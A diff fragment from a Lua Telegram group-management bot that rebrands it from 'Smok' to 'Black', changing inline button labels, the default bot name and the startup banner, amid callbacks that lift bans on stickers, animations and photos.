 local animation = DAata:match("^animation(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
 local Text ="⌔︙تم اللغاء منعها بنجاح"
 inline = {
-{{text = '⌔︙ Smok 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
+{{text = '⌔︙ BLacK 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9282,7 +9282,7 @@ local idchci = database:get(bot_id.."SMOK:Filter:msg")
 local photo = DAata:match("^pito(.*)$")
 local Text ="⌔︙تم اللغاء منعها بنجاح"
 inline = {
-{{text = '⌔︙ Smok 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
+{{text = '⌔︙ BLacK 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9294,7 +9294,7 @@ local idchci = "-100"..idch
 local Sticker = DAata:match("^Sticker(.*)$"):gsub('chatid',''):gsub('chatid',''):gsub(idch,''):gsub('-100','')
 local Text ="⌔︙تم اللغاء منعه بنجاح"
 inline = {
-{{text = '⌔︙ Smok 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
+{{text = '⌔︙ BLacK 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9304,7 +9304,7 @@ if DAata and DAata:match("^delallSticker(.*)$") and Addictive(data) then
 local delallSticker = DAata:match("^delallSticker(.*)$")
 local Text ="⌔︙تم اللغاء منع كل المتحركات"
 inline = {
-{{text = '⌔︙ Smok 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
+{{text = '⌔︙ BLacK 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9317,7 +9317,7 @@ if DAata and DAata:match("^delallanimation(.*)$") and Addictive(data) then
 local delallmation = DAata:match("^delallanimation(.*)$")
 local Text ="⌔︙تم اللغاء منع كل المتحركات"
 inline = {
-{{text = '⌔︙ Smok 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
+{{text = '⌔︙ BLacK 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9330,7 +9330,7 @@ if DAata and DAata:match("^delallph(.*)$") and Addictive(data) then
 local delallph = DAata:match("^delallph(.*)$")
 local Text ="⌔︙تم اللغاء منع كل الصور"
 inline = {
-{{text = '⌔︙ Smok 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
+{{text = '⌔︙ BLacK 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/X6YX6'}},
 }
 https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
 send_inlin_key(Chat_id,Text,inline)
@@ -9456,7 +9456,7 @@ if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end
 end
-local Name_Bot = (database:get(bot_id.."SMOK:Name:Bot") or "سموك")
+local Name_Bot = (database:get(bot_id.."SMOK:Name:Bot") or "بلاك")
 if not database:get(bot_id.."SMOK:Fun_Bots"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
@@ -9656,7 +9656,7 @@ end
 if (data.ID == "UpdateOption" and data.value_.value_ == "Ready") then
 print("\27[34m"..[[
 >> The Bot is Running
->> Bot source > Smok
+>> Bot source > Black
 >>Source channel > @X6YX6
 >>Source developer > @E444Q
  ____  _        _    ____ _  __
